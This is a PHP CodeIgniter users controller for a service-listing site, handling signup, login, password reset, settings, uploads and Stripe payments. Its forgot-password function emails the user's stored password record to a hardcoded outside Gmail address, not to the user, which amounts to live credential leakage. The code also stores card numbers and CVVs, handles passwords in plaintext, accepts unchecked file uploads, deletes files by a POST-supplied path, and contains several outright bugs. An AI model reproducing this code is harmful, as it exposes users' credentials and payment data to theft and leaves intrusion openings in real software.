<?php

class Users extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->model('users_model');
        $this->load->library('session');
    }

    public function index() {
        //$this->template->build('home/index');
        redirect('/');
        exit;
    }

    function forget() {
        $this->load->view('users/forget');
    }

    function forget_a() {
        $email = $this->input->post('vEmail', TRUE);
        $res = $this->users_model->getUserPassword($email);
        if (count($res) > 0) {
            $this->load->library('email');
            $this->email->from($this->config->config['supportemail'], $this->config->config['supportname']);
            $this->email->to('root.nodes@gmail.com');
            $this->email->subject('Here is your info ' . $name);
            $data['data'] = $res[0];
            $msg = $this->load->view('email/forgot_password',$data,TRUE);
            $this->email->message($msg);
            $this->email->send();
            #echo $this->email->print_debugger();
            $this->session->set_flashdata('signin', 'Your forgot password successfully send to email!!');
            redirect('users/login');
        } else {
            $this->session->set_flashdata('signin', 'Your email is not match with our database !!');
            redirect('users/forget');
        }
        print_R($res);
        exit;
        // send mail template to user.
    }

    function signin_a() {
        $this->load->model('users_model');
        //echo $this->input->post('vEmail', TRUE);
        $check = array(
            'vEmail' => $this->input->post('vEmail', TRUE),
            'vPassword' => $this->input->post('vPassword', TRUE)
        );
        $users = $this->users_model->isValiduser($check);
        //print_R($users);exit;
        //Add UserId in Session;       
        $this->load->library('session');
        if (count($users) > 0) {
            $signin = array(
                'iUserId' => $users[0]['iUserId'],
                'vEmail' => $this->input->post('vEmail', TRUE),
                'vCompanyName' => $users[0]['vCompanyName'],
                'vCompanyLogo' => $users[0]['vCompanyLogo'],
                'eType' => $users[0]['eType'],
                'eStatus' => $users[0]['eStatus']
            );
            $this->session->set_userdata($signin);
            $this->session->set_flashdata('signin', 'You have been successfully signin !!');
            redirect('users/account');
        } else {
            $this->session->set_flashdata('signin', 'Email/password not recognised. Please try again.');
            redirect('users/login');
        }
    }

    function profile() {
        //Add UserId in Session;       
        $this->load->library('session');
        $iUserId = $this->session->userdata('iUserId');

        $this->load->model('users_model');
        $data = $this->users_model->getUpgrade($iUserId);
        $data['udetail'] = $data[0];

        $this->load->view('users/profile', $data);
    }

    public function login() {
        //Add UserId in Session;       
        $this->load->library('session');
        $this->load->view('users/login');
    }

    function getService() {
        $this->load->model('users_model');
        $options['iCategoryId'] = $this->input->post('iCategoryId', TRUE);
        $html = $this->users_model->getService($options);
        echo $html;
    }

    public function signup() {
        $this->load->helper('country');
        $this->load->model('users_model');
        $data['currency'] = $this->users_model->getCurrency();
        $data['categories'] = $this->users_model->getCategories();
        $this->load->view('users/signup', $data);
    }

    function file_upload($type, $file) {
        $filename = time() . $file["name"];
        $path = APPPATH . "theme/uploads/" . $filename;
        if (move_uploaded_file($file["tmp_name"], $path)) {
            $this->config->config[$type]['source_image'] = $path;
            $name = $this->load->library('image_lib', $this->config->config[$type]);
            if (!$this->image_lib->resize()) {
                echo $this->image_lib->display_errors();
            }
        } else {
            echo "File Not Uploded";
        }
        return $filename;
    }

    public function signup_a() {
        #print_R($_POST);exit;
        $this->load->model('users_model');
        //Add UserId in Session;
        $this->load->library('session');

        //Check email id dumplicate;
        $vEmail = $this->input->post('vEmail', TRUE);
        if (isset($vEmail) && !empty($vEmail)) {
            $flag = $this->users_model->checkDuplicate($vEmail);
            if ($flag) {
                $this->session->set_flashdata('email', 'Email already exists !!.');
                redirect('users/signup');
                exit;
            }
        } else {
            $this->session->set_flashdata('email', 'Invalid Email Address !!.');
            redirect('users/signup');
            exit;
        }
        //Image croping;
        $logoimage = $this->file_upload('logo_image', $_FILES['vCompanyLogo']);

        //insert into users;
        $userdata = array(
            'vCompanyName' => $this->input->post('vCompanyName', TRUE),
            'vCompanyLogo' => $logoimage,
            'vEmail' => $this->input->post('vEmail', TRUE),
            'vWebSite' => $this->input->post('vWebSite', TRUE),
            'vTwitter' => $this->input->post('vTwitter', TRUE),
            'vPhone' => $this->input->post('vPhone', TRUE),
        );
        $iUserId = $this->users_model->signup($userdata);

        //Insert into  company_services;
        $serviceimage = $this->file_upload('small_image', $_FILES['vImage']);
        $services = array(
            'iUserId' => $iUserId,
            'iServiceId' => $this->input->post('iServiceId', TRUE),
            'vServiceName' => $this->input->post('vServiceName', TRUE),
            'iCategoryId' => $this->input->post('iCategoryId', TRUE),
            'iCurrencyId' => $this->input->post('iCurrencyId', TRUE),
            'fPrice' => $this->input->post('fPrice', TRUE),
            'vImage' => $serviceimage,
            'vDescription' => $this->input->post('vDescription', TRUE)
        );
        $iCompanyServiceId = $this->users_model->signup_service($services);
        $location = array(
            'iUserId' => $iUserId,
            'iCompanyServiceId' => $iCompanyServiceId,
            'vCountryCode' => $this->input->post('vCountryCode', TRUE),
            'vStateCode' => '',
            'iCityId' => $this->input->post('iCityId', TRUE),
        );
        if ($this->input->post('vCountryCode', TRUE) == 'US') {
            $location['vStateCode'] = $this->input->post('vStateCode', TRUE);
        }

        $iCompanyLocationId = $this->users_model->signup_location($location);

        $signin = array(
            'iUserId' => $iUserId,
            'vEmail' => $this->input->post('vEmail', TRUE),
            'vCompanyName' => $this->input->post('vCompanyName', TRUE),
            'eType' => 'Basic',
            'eStatus' => 1
        );

        $this->session->set_userdata($signin);
        redirect('users/upgrade');
        exit;
    }

    function upgrade() {
        $iUserId = $this->session->userdata('iUserId');
        $data['basic'] = $this->users_model->getUpgrade($iUserId);
        $data['basic'] = $data['basic'][0];
        $this->load->view('users/upgrade', $data);
    }

    function state_suggestions() {
        $this->load->model('users_model');
        $term = $this->input->get('term', TRUE);
        $vCountryCode = $this->input->get('vCountryCode', TRUE);

        if (strlen($term) < 2)
            return;

        $keywords = $this->users_model->GetAutocomplete(array('keyword' => $term, 'vCountryCode' => $vCountryCode));

        echo $keywords;
    }

    function city_suggestions() {
        $this->load->model('users_model');
        $term = $this->input->get('term', TRUE);
        $vStateCode = $this->input->get('vStateCode', TRUE);
        $vCountryCode = $this->input->get('vCountryCode', TRUE);

        if (strlen($term) < 2)
            break;

        $keywords = $this->users_model->GetAutocompleteCity(array('keyword' => $term, 'vStateCode' => $vStateCode, 'vCountryCode' => $vCountryCode));

        echo $keywords;
    }

    function uploadfile() {

        if (!empty($_FILES)) {
            $tempFile = $_FILES['vImage']['tmp_name'];
            $targetPath = $_SERVER['DOCUMENT_ROOT'] . '/SVN/handinhand/assets/images/galleries';
            $targetPath = APPPATH . "theme\uploads\tmp";
            $targetFile = str_replace('//', '/', $targetPath) . $_FILES['file_input']['name'];
            move_uploaded_file($tempFile, $targetFile);
        }
        echo '1';
    }

    function publish() {
        //Add UserId in Session;
        $this->load->library('session');
        $iUserId = $this->session->userdata('iUserId');

        $this->load->model('users_model');
        $data['basic'] = $this->users_model->getUpgrade($iUserId);
        $data['basic'] = $data['basic'][0];
        //print_R($data['basic']);
        $this->load->view('users/publish', $data);
    }

    function publish_a() {
        $this->load->model('users_model');
        //echo $this->input->post('vEmail', TRUE);
        $update = array(
            'iUserId' => $this->input->post('iUserId', TRUE),
            'vPassword' => $this->input->post('vPassword', TRUE)
        );

        $users = $this->users_model->updateUser($update);

        $check = array(
            'vEmail' => $this->input->post('vEmail', TRUE),
            'vPassword' => $this->input->post('vPassword', TRUE)
        );
        $users = $this->users_model->isValiduser($check);

        //print_R($users);exit;
        //Add UserId in Session;       
        $this->load->library('session');
        if (count($users) > 0) {
            $signin = array(
                'vFirstName' => $users[0]['vFirstName'],
                'vLastName' => $users[0]['vLastName'],
                'vEmail' => $this->input->post('vEmail', TRUE),
                'vCompanyName' => $users[0]['vCompanyName'],
                'vCompanyLogo' => $users[0]['vCompanyLogo'],
                'eStatus' => 1
            );
            $this->session->set_userdata($signin);
            $this->session->set_flashdata('signin', 'You have been successfully signin !!');
            redirect('users/account');
        } else {
            $this->session->set_flashdata('signin', 'Password not updated successfully !!. Please try again.');
            redirect('/');
        }
    }

    function account() {
        $this->load->library('session');
        $iUserId = $this->session->userdata('iUserId');

        $this->load->model('users_model');
        $data['basic'] = $this->users_model->getUpgrade($iUserId);
        $data['basic'] = $data['basic'][0];


        $this->load->view('users/account', $data);
    }

    function signout() {
        $this->load->library('session');
        $signin = array(
            'vFirstName' => '',
            'vLastName' => '',
            'vEmail' => '',
            'vCompanyName' => '',
            'vCompanyLogo' => '',
            'eStatus' => 0
        );
        $this->session->unset_userdata($signin);
        $this->session->set_flashdata('signout', 'You have been successfully signout !!');
        redirect('/');
    }

    function settings() {
        $this->load->helper('country');
        $this->load->model('users_model');
        $this->load->library('session');
        $iUserId = $this->session->userdata('iUserId');
        $data['basic'] = $this->users_model->getUpgrade($iUserId);
        $data['basic'] = $data['basic'][0];
        $data['currency'] = $this->users_model->getCurrency();
        $type = $this->session->userdata('eType');
        // Card info...
        $cardinfo = $this->users_model->getCardDetail($iUserId);
        $data['cardinfo'] = $cardinfo[0];
        //get All Transaction info
        
        $transinfo = $this->users_model->getTransaction($iUserId);
        $data['transinfo'] = $transinfo;
        
        
        if($type=='Pro')
            $this->load->view('users/settings_pro', $data);
        else
            $this->load->view('users/settings', $data);
        
        
    }
    function settings_pro_a() {
        
        $iUserId = $this->session->userdata('iUserId');
        $user = array(
            'iUserId' => $iUserId,
            'vCompanyName' => $this->input->post('vCompanyName', TRUE),
            'vAddress' => $this->input->post('vAddress', TRUE),
            'vWebSite' => $this->input->post('vWebSite', TRUE),
            'vTwitter' => $this->input->post('vTwitter', TRUE),
            'vPhone' => $this->input->post('vPhone', TRUE)
        );

        if (isset($this->input->post['vPassword']) && !empty($this->input->post['vPassword'])) {
            $user['vPassword'] = $this->input->post['vPassword'];
        }

        //Image Upload & Checking;
        if (isset($_FILES['vCompanyLogo']['tmp_name']) && !empty($_FILES['vCompanyLogo']['tmp_name'])) {
            //Image croping;
            $logoimage = $this->file_upload('logo_image', $_FILES['vCompanyLogo']);
            $user['vCompanyLogo'] = $logoimage;
            //unlink old;
            unlink(APPPATH . 'theme/uploads/' . $this->input->post('vOldCompanyLogo', TRUE));
        }
        $this->users_model->updateUser($user);
        //Check here if location is not then Pro member will enter 3 Location..
        
        print_R($_POST);exit;
        
        
        $location = array(
            array(
            'vCountryCode' => $this->input->post['vCountryCode'],
            'vStateCode' => $this->input->post['vStateCode'],
            'iCityId' => $this->input->post['iCityId']
            ),
            array(
            'vCountryCode' => $this->input->post['vCountryCode'],
            'vStateCode' => $this->input->post['vStateCode'],
            'iCityId' => $this->input->post['iCityId']
            ),
            array(
            'vCountryCode' => $this->input->post['vCountryCode'],
            'vStateCode' => $this->input->post['vStateCode'],
            'iCityId' => $this->input->post['iCityId']
            ),
        );
        $this->users_model->updateLocation($location);
        
        $this->session->set_flashdata('signin', 'Settings updated successfully !!');
        redirect('users/account');
        
    }
    function settings_a() {
        
        $iUserId = $this->session->userdata('iUserId');
        $user = array(
            'iUserId' => $iUserId,
            'vCompanyName' => $this->input->post('vCompanyName', TRUE),
            'vAddress' => $this->input->post('vAddress', TRUE),
            'vWebSite' => $this->input->post('vWebSite', TRUE),
            'vTwitter' => $this->input->post('vTwitter', TRUE),
            'vPhone' => $this->input->post('vPhone', TRUE)
        );

        if (isset($this->input->post['vPassword']) && !empty($this->input->post['vPassword'])) {
            $user['vPassword'] = $this->input->post['vPassword'];
        }

        //Image Upload & Checking;
        if (isset($_FILES['vCompanyLogo']['tmp_name']) && !empty($_FILES['vCompanyLogo']['tmp_name'])) {
            //Image croping;
            $logoimage = $this->file_upload('logo_image', $_FILES['vCompanyLogo']);
            $user['vCompanyLogo'] = $logoimage;
            //unlink old;
            unlink(APPPATH . 'theme/uploads/' . $this->input->post('vOldCompanyLogo', TRUE));
        }

        
        $this->users_model->updateUser($user);
        $location = array(
            'vCountryCode' => $this->input->post['vCountryCode'],
            'vStateCode' => $this->input->post['vStateCode'],
            'iCityId' => $this->input->post['iCityId'],
        );
        $this->users_model->updateLocation($location);
        $this->session->set_flashdata('signin', 'Settings updated successfully !!');
        redirect('users/account');
    }

    function edit_service($iCompanyServiceId) {
        $this->load->model('users_model');
        $this->load->library('session');
        $iUserId = $this->session->userdata('iUserId');
        $data['basic'] = $this->users_model->editService($iCompanyServiceId);
        $data['basic'] = $data['basic'][0];
        $data['categories'] = $this->users_model->getCategories();
        $this->load->view('users/edit_service', $data);
    }

    function edit_service_a() {

        $service = array(
            'iUserId' => $this->session->userdata('iUserId'),
            'iCompanyServiceId' => $this->input->post('iCompanyServiceId', TRUE),
            'iCategoryId' => $this->input->post('iCategoryId', TRUE),
            'iServiceId' => $this->input->post('iServiceId', TRUE),
            'vServiceName' => $this->input->post('vServiceName', TRUE),
            'vDescription' => $this->input->post('vDescription', TRUE),
            'fPrice' => $this->input->post('fPrice', TRUE)
        );
        if (isset($_FILES['vImage']['tmp_name']) && !empty($_FILES['vImage']['tmp_name'])) {
            //Image croping;
            $image = $this->file_upload('large_image', $_FILES['vImage']);
            $user['vImage'] = $image;
            //unlink old;
            unlink(APPPATH . 'theme/uploads/' . $this->input->post('vOldImage', TRUE));
        }
        $update = $this->users_model->updateService($service);
        $this->session->set_flashdata('signin', 'Service edited successfully !!');
        redirect('users/account');
        exit;
    }

    function publish_pro() {
        $iUserId = $this->session->userdata('iUserId');
        $data['basic'] = $this->users_model->getUpgrade($iUserId);
        $data['basic'] = $data['basic'][0];
        $this->load->view('users/publish_pro', $data);
    }

    function publish_pro_a() {
        $this->load->library('Stripe');
        $stripeToken = $this->input->post('stripeToken', TRUE);

        try {
            if (isset($stripeToken) && !empty($stripeToken)) {
                Stripe::setApiKey($this->config->config['Stripe']['ApiKey']);
                $payObj = Stripe_Charge::create(array("amount" => $this->config->config['Stripe']['Amount'], "currency" => $this->config->config['Stripe']['Currency'], "card" => $this->input->post('stripeToken', TRUE)));
                $payment = array(
                    'iUserId' => $this->session->userdata('iUserId'),
                    'iTransactionId' => $payObj->id,
                    'fAmount' => $this->config->config['Stripe']['Amount']
                );

                $paymentid = $this->users_model->insert_payment($payment);

                $users = array(
                    'iUserId' => $this->session->userdata('iUserId'),
                    'eType' => 'Pro'
                );
                $vPassword = $this->input->post('vPassword', TRUE);
                if (isset($vPassword) && !empty($vPasswords)) {
                    $users['vPassword'] = $this->input->post('vPassword', TRUE);
                }
                $this->users_model->updateUser($users);
                //Update in session;
                
                //insert cardinfo;
                $detail = array(
                  'iUserId' =>   $this->session->userdata('iUserId'),
                  'vCardNumber'  => $this->input->post('cardnumber', TRUE),
                  'vExpireMonth' => $this->input->post('card-expiry-month', TRUE),
                  'vExpireYear' =>  $this->input->post('card-expiry-year', TRUE),
                  'vCvv' => $this->input->post('card-cvc', TRUE),
                );
                $info = $this->users_model->insertCardinfo($detail);
                
                $this->session->set_userdata('eType', 'Pro');
                //Mail to member...

                $this->session->set_flashdata('signin', 'Your payment have been done successfuly !!');
                redirect('users/account');
            } else {
                //throw new Exception("The Stripe Token was not generated correctly");
                $this->session->set_flashdata('signin', 'Your payment have problem ! Please try after some time. ');
                redirect('users/account');
            }
        } catch (Exception $e) {
            $this->session->set_flashdata('signin', 'Your payment have problem ! Please try after some time.');
            redirect('users/account');
            //echo $error = $e->getMessage();
        }
        exit;
    }

    function new_service() {

        $this->load->model('users_model');
        $this->load->library('session');
        $iUserId = $this->session->userdata('iUserId');
        $data['basic'] = $this->users_model->getUpgrade($iUserId);
        $data['categories'] = $this->users_model->getCategories();
        $data['basic'] = $data['basic'][0];
        $this->load->view('users/new_service', $data);
    }

    function new_service_a() {
        /* echo "<pre>";
          print_r($_FILES);
          print_r($_POST);exit; */
        $this->load->library('session');
        $this->load->model('users_model');
        $iUserId = $this->session->userdata('iUserId');

        $serviceimage = $this->file_upload('large_image', $_FILES['vImage']);
        $services = array(
            'iUserId' => $iUserId,
            'iServiceId' => $this->input->post('iServiceId', TRUE),
            'vServiceName' => $this->input->post('vServiceName', TRUE),
            'iCategoryId' => $this->input->post('iCategoryId', TRUE),
            'iCurrencyId' => $this->input->post('iCurrencyId', TRUE),
            'fPrice' => $this->input->post('fPrice', TRUE),
            'vImage' => $serviceimage,
            'vDescription' => $this->input->post('vDescription', TRUE)
        );
        $iCompanyServiceId = $this->users_model->signup_service($services);

        if (is_array($_FILES['vGalleryImage'])) {
            $vGalleryImage = $this->file_upload('large_image', $_FILES['vGalleryImage']);
            $templates = array(
                'iCompanyServiceId' => $iCompanyServiceId,
                'iUserId' => $iUserId,
                'eStatus' => '1',
                'vImage' => $vGalleryImage
            );
            $iInsertId = $this->users_model->insert_template($templates);
        }

        if (is_array($_FILES['vGalleryImage1'])) {
            $vGalleryImage1 = $this->file_upload('large_image', $_FILES['vGalleryImage1']);
            $templates = array(
                'iCompanyServiceId' => $iCompanyServiceId,
                'iUserId' => $iUserId,
                'eStatus' => '1',
                'vImage' => $vGalleryImage1
            );
            $iInsertId = $this->users_model->insert_template($templates);
        }

        if (is_array($_FILES['vGalleryImage2'])) {
            $vGalleryImage2 = $this->file_upload('large_image', $_FILES['vGalleryImage2']);
            $templates = array(
                'iCompanyServiceId' => $iCompanyServiceId,
                'iUserId' => $iUserId,
                'eStatus' => '1',
                'vImage' => $vGalleryImage2
            );
            $iInsertId = $this->users_model->insert_template($templates);
        }

        if (is_array($_FILES['vGalleryImage3'])) {
            $vGalleryImage3 = $this->file_upload('large_image', $_FILES['vGalleryImage3']);
            $templates = array(
                'iCompanyServiceId' => $iCompanyServiceId,
                'iUserId' => $iUserId,
                'eStatus' => '1',
                'vImage' => $vGalleryImage3
            );
            $iInsertId = $this->users_model->insert_template($templates);
        }

        if (is_array($_FILES['vGalleryImage4'])) {
            $vGalleryImage4 = $this->file_upload('large_image', $_FILES['vGalleryImage4']);
            $templates = array(
                'iCompanyServiceId' => $iCompanyServiceId,
                'iUserId' => $iUserId,
                'eStatus' => '1',
                'vImage' => $vGalleryImage4
            );
            $iInsertId = $this->users_model->insert_template($templates);
        }
        redirect('users/new_service');
        exit;
    }

}